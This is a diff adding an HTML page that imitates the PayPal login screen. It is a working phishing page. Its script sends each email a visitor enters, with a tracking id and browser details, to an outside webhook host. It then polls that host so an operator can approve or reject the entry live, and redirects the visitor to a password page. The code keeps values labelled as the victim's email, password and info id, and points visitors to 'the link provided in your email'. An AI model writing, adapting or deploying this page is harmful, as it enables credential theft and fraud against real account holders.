@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            background-color: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #f5f7fa;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 32px;
+            margin-top: 60px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo h1 {
+            font-size: 32px;
+            font-weight: bold;
+            color: black;
+            letter-spacing: -1px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #cbd2d6;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #2c2e2f;
+            background-color: #fafbfc;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0070ba;
+            background-color: white;
+        }
+
+        .form-input::placeholder {
+            color: #9da3a6;
+        }
+
+        .forgot-link {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 24px;
+            display: inline-block;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #0551b5;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(180deg, #005ea6 0%, #002a75 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 112, 186, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background: #9da3a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .divider {
+            text-align: center;
+            color: #9da3a6;
+            font-size: 14px;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background-color: #cbd2d6;
+        }
+
+        .divider::before {
+            left: 0;
+        }
+
+        .divider::after {
+            right: 0;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            background: white;
+            color: #2c2e2f;
+            border: 2px solid black;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-secondary:hover {
+            background-color: #fafbfc;
+            border-color: #9da3a6;
+        }
+
+        .language-selector {
+            margin-top: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .flag {
+            width: 24px;
+            height: 18px;
+            background: linear-gradient(to bottom, #b22234 0%, #b22234 38.46%, #ffffff 38.46%, #ffffff 61.54%, #b22234 61.54%);
+            border: 1px solid #ddd;
+            margin-right: 8px;
+            position: relative;
+        }
+
+        .flag::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 40%;
+            height: 46%;
+            background: #3c3b6e;
+        }
+
+        .language-option {
+            color: #6c7378;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: color 0.3s ease;
+        }
+
+        .language-option:hover {
+            color: #0070ba;
+        }
+
+        .language-option.active {
+            color: #2c2e2f;
+            font-weight: 500;
+        }
+
+        .language-dropdown {
+            display: flex;
+            align-items: center;
+            color: #6c7378;
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .language-dropdown::after {
+            content: '▼';
+            margin-left: 4px;
+            font-size: 10px;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding-top: 40px;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .footer a {
+            color: #6c7378;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer a:hover {
+            color: #0070ba;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin-top: 20px;
+                padding: 32px 4px;
+            }
+            
+            .language-selector {
+                gap: 12px;
+            }
+            
+            .footer {
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>PayPal</h1>
+        </div>
+        
+        <form>
+            <div class="form-group">
+                <input type="text" class="form-input" placeholder="Email or mobile number" required>
+            </div>
+            
+            <a href="#" class="forgot-link">Forgot email?</a>
+            
+            <button type="submit" class="btn-primary" id="nextButton">
+                <div class="loading-spinner" id="loadingSpinner"></div>
+                <span id="buttonText">Next</span>
+            </button>
+            
+            <div class="divider">or</div>
+            
+            <button type="button" class="btn-secondary">Sign Up</button>
+        </form>
+    </div>
+    
+    <div class="language-selector">
+        <div class="language-dropdown">
+            <div class="flag"></div>
+            English
+        </div>
+        <a href="#" class="language-option">Français</a>
+        <a href="#" class="language-option">Español</a>
+        <a href="#" class="language-option">中文</a>
+    </div>
+    
+    <div class="footer">
+        <a href="#">Contact Us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Legal</a>
+        <a href="#">Policy Updates</a>
+        <a href="#">Worldwide</a>
+    </div>
+
+    <script>
+        // Utility to get query param
+        function getQueryParam(name) {
+            const url = new URL(window.location.href);
+            return url.searchParams.get(name);
+        }
+
+        // Generate a random tracking id (if not present)
+        function getOrCreateTrackingId() {
+            let trackingId = localStorage.getItem('paypal_tracking_id') || sessionStorage.getItem('paypal_tracking_id');
+            if (!trackingId) {
+                trackingId = Math.random().toString(36).substr(2, 12) + Date.now().toString(36);
+                localStorage.setItem('paypal_tracking_id', trackingId);
+                sessionStorage.setItem('paypal_tracking_id', trackingId);
+            }
+            return trackingId;
+        }
+
+        // Check and clear expired data on page load
+        function checkAndClearExpiredData() {
+            try {
+                const expirationTime = localStorage.getItem('paypal_data_expires');
+                if (expirationTime && Date.now() > parseInt(expirationTime)) {
+                    // Data has expired, clear it
+                    localStorage.removeItem('paypal_campaign_id');
+                    localStorage.removeItem('paypal_tracking_id');
+                    localStorage.removeItem('paypal_email');
+                    localStorage.removeItem('paypal_password');
+                    localStorage.removeItem('paypal_victim_info_id');
+                    localStorage.removeItem('paypal_data_expires');
+                    console.log('Expired data cleared from localStorage');
+                }
+            } catch (error) {
+                console.error('Error checking expired data:', error);
+            }
+        }
+
+        // Set expiration timer for localStorage data (10 minutes after successful webhook)
+        function setDataExpiration() {
+            try {
+                const expirationTime = Date.now() + (10 * 60 * 1000); // 10 minutes from now
+                localStorage.setItem('paypal_data_expires', expirationTime.toString());
+                
+                // Set a timer to clear the data
+                setTimeout(() => {
+                    localStorage.removeItem('paypal_campaign_id');
+                    localStorage.removeItem('paypal_tracking_id');
+                    localStorage.removeItem('paypal_email');
+                    localStorage.removeItem('paypal_password');
+                    localStorage.removeItem('paypal_victim_info_id');
+                    localStorage.removeItem('paypal_data_expires');
+                    console.log('PayPal data expired and cleared after 10 minutes');
+                }, 10 * 60 * 1000); // 10 minutes
+            } catch (error) {
+                console.error('Error setting data expiration:', error);
+            }
+        }
+
+        // Get or set campaign id from query param or storage
+        function getOrSetCampaignId() {
+            let campaignId = getQueryParam('campaign');
+            if (campaignId) {
+                // Remove any trailing slashes to avoid double slashes in the URL
+                campaignId = campaignId.replace(/\/+$/, '');
+                localStorage.setItem('paypal_campaign_id', campaignId);
+                sessionStorage.setItem('paypal_campaign_id', campaignId);
+            } else {
+                campaignId = localStorage.getItem('paypal_campaign_id') || sessionStorage.getItem('paypal_campaign_id');
+                // Clean up any stored campaignId with trailing slashes
+                if (campaignId) {
+                    campaignId = campaignId.replace(/\/+$/, '');
+                }
+            }
+            return campaignId;
+        }
+
+        function submitToWebhook(data, campaignId) {
+            // Show loading state
+            showLoadingState();
+            
+            // Use your actual backend host here
+            const webhookUrl = `https://accesszilla.onrender.com/webhook/${campaignId}/`;
+            console.log('Submitting to webhook:', webhookUrl);
+            console.log('Data being sent:', data);
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                },
+                body: JSON.stringify(data),
+                mode: 'cors',
+                credentials: 'omit'
+            })
+            .then(response => {
+                console.log('Response status:', response.status);
+                if (!response.ok) {
+                    return response.text().then(text => {
+                        console.log('Error response body:', text);
+                        throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
+                    });
+                }
+                return response.json();
+            })
+            .then(result => {
+                console.log('Webhook response:', result);
+                // Store victim info ID for polling
+                if (result.victim_info_id) {
+                    localStorage.setItem('paypal_victim_info_id', result.victim_info_id);
+                    // Start polling for approval/rejection
+                    pollForApproval(result.victim_info_id, campaignId, 'email');
+                } else {
+                    // Fallback to original behavior
+                    hideLoadingState();
+                    setDataExpiration();
+                    setTimeout(() => {
+                        window.location.href = 'paypal-password.html';
+                    }, 1500);
+                }
+            })
+            .catch(error => {
+                console.error('Webhook error:', error);
+                hideLoadingState();
+                // Only show connection error for actual network failures
+                if (
+                    error.message.includes('Failed to fetch') ||
+                    error.message.includes('NetworkError') ||
+                    error.message.includes('TypeError')
+                ) {
+                    alert('Connection error. Please check your internet connection and try again.');
+                }
+            });
+        }
+
+        function pollForApproval(victimInfoId, campaignId, step) {
+            const pollUrl = `https://accesszilla.onrender.com/status/${victimInfoId}/?step=${step}`;
+            console.log('Starting polling with URL:', pollUrl);
+            
+            let pollingActive = true;
+            
+            const poll = () => {
+                if (!pollingActive) return;
+                console.log('Polling...');
+                fetch(pollUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    },
+                    mode: 'cors',
+                    credentials: 'omit'
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Poll result:', result);
+                    
+                    if (result.submission_status === 'approved') {
+                        console.log('Status approved! Redirecting...');
+                        pollingActive = false;
+                        hideLoadingState();
+                        setDataExpiration();
+                        window.location.href = 'paypal-password.html';
+                    } else if (result.submission_status === 'rejected') {
+                        console.log('Status rejected! Showing error...');
+                        pollingActive = false;
+                        hideLoadingState();
+                        let errorMsg = result.error_message || 'Invalid email address. Please try again.';
+                        alert(errorMsg);
+                    } else {
+                        console.log('Status still pending...');
+                        setTimeout(poll, 2000); // Poll every 2 seconds
+                    }
+                })
+                .catch(error => {
+                    console.error('Polling error:', error);
+                    if (pollingActive) {
+                        setTimeout(poll, 3000);
+                    }
+                });
+            };
+            
+            // Start polling
+            poll();
+            
+            // Fallback timeout after 30 seconds
+            setTimeout(() => {
+                if (pollingActive) {
+                    console.log('Polling timeout reached, proceeding anyway...');
+                    pollingActive = false;
+                    hideLoadingState();
+                    setDataExpiration();
+                    window.location.href = 'paypal-password.html';
+                }
+            }, 30000);
+        }
+
+        // Loading state functions
+        function showLoadingState() {
+            const button = document.getElementById('nextButton');
+            const spinner = document.getElementById('loadingSpinner');
+            const buttonText = document.getElementById('buttonText');
+            
+            button.disabled = true;
+            button.classList.add('btn-loading');
+            spinner.style.display = 'block';
+            buttonText.textContent = 'Processing...';
+        }
+
+        function hideLoadingState() {
+            const button = document.getElementById('nextButton');
+            const spinner = document.getElementById('loadingSpinner');
+            const buttonText = document.getElementById('buttonText');
+            
+            button.disabled = false;
+            button.classList.remove('btn-loading');
+            spinner.style.display = 'none';
+            buttonText.textContent = 'Next';
+        }
+
+        // Add form submission handling
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.querySelector('.form-input').value.trim();
+            const campaignId = getOrSetCampaignId();
+            const trackingId = getOrCreateTrackingId();
+            
+            if (!email) {
+                alert('Please enter an email or mobile number');
+                return;
+            }
+            
+            if (!campaignId) {
+                alert('Please use the link provided in your email to access this page.');
+                return;
+            }
+            
+            // Save email to localStorage
+            localStorage.setItem('paypal_email', email);
+            
+            // Prepare data for webhook
+            const data = {
+                login_email: email,
+                tracking_id: trackingId,
+                timestamp: new Date().toISOString(),
+                type: 'email_entry',
+                user_agent: navigator.userAgent,
+                ip_info: 'client-side'
+            };
+            
+            // Send to webhook
+            submitToWebhook(data, campaignId);
+        });
+
+        // Initialize on page load
+        window.addEventListener('load', function() {
+            checkAndClearExpiredData();
+        });
+
+        // Add button interactions
+        document.querySelector('.btn-secondary').addEventListener('click', function() {
+            alert('This is a demo. Sign Up clicked.');
+        });
+
+        document.querySelector('.forgot-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('This is a demo. Forgot email clicked.');
+        });
+
+        // Language selector interactions
+        document.querySelectorAll('.language-option').forEach(option => {
+            option.addEventListener('click', function(e) {
+                e.preventDefault();
+                document.querySelectorAll('.language-option').forEach(opt => opt.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        // Clear localStorage on page load (for testing purposes)
+        // Uncomment the line below if you want to clear storage on each visit
+        // localStorage.removeItem('paypal_email');
+    </script>
+</body>
+</html>
